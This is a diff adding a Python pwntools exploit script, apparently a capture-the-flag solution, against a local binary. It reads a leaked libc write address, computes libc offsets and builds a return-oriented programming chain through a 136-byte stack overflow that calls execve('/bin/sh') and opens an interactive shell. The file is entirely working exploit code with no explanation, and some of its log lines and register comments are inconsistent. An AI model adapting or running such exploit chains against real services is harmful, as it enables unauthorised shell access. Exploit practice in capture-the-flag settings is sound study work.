@@ -1,0 +1,66 @@
+#!/usr/bin/python 
+#coding: utf-8
+__author__ = "TaQini"
+from pwn import *
+
+context.log_level = 'debug'
+
+# load program
+p = process('./main')
+addr = "127.0.0.1"
+#p = remote(addr,1234)
+
+# get info from ELF
+elf = ELF('main')
+libc = ELF('libc.so.6')
+# infomation
+write_libc = libc.symbols['write']
+log.info("write@libc: " + hex(write_libc))
+
+system_libc = libc.symbols['execve']
+log.info("system@libc: " + hex(system_libc))
+
+binsh_libc = libc.search('/bin/sh').next()
+log.info("binsh@libc: " + hex(system_libc))
+
+# overflow point
+buflen = 136
+padding = 0xdeadbeef
+# gadgets
+# 0x0040061e      415d           pop r13
+# 0x00400620      415e           pop r14
+# 0x00400622      415f           pop r15
+# 0x00400624      c3             ret
+pppr = 0x004005ea
+
+write = u64(p.recv(8))
+
+log.info("write= " + hex(write))
+system = system_libc - write_libc + write
+log.info("system= " + hex(system))
+# mov rdx, r15; mov rsi, r14; mov rdi, r13; call rax;
+mmmc = 0x00000000001396be - write_libc + write
+log.info("mmmc= " + hex(mmmc))
+prax = 0x00000000000439c8 - write_libc + write# pop rax; ret;
+log.info("poprax= " + hex(prax))
+binsh = binsh_libc - write_libc + write
+log.info("binsh= " + hex(binsh))
+
+payload = ""
+payload += "\x00" * buflen
+payload += p64(pppr)
+r13 = binsh            # mov    rdx,r13
+r14 = 0                # mov    rsi,r14
+r15 = 0                # mov    edi,r15
+ret = prax
+payload += p64(r13) + p64(r14) + p64(r15) + p64(ret)
+rax = system
+ret = mmmc
+payload += p64(rax) + p64(ret)
+
+# gdb.attach(p)
+p.sendline(payload)
+
+p.interactive()
+
+
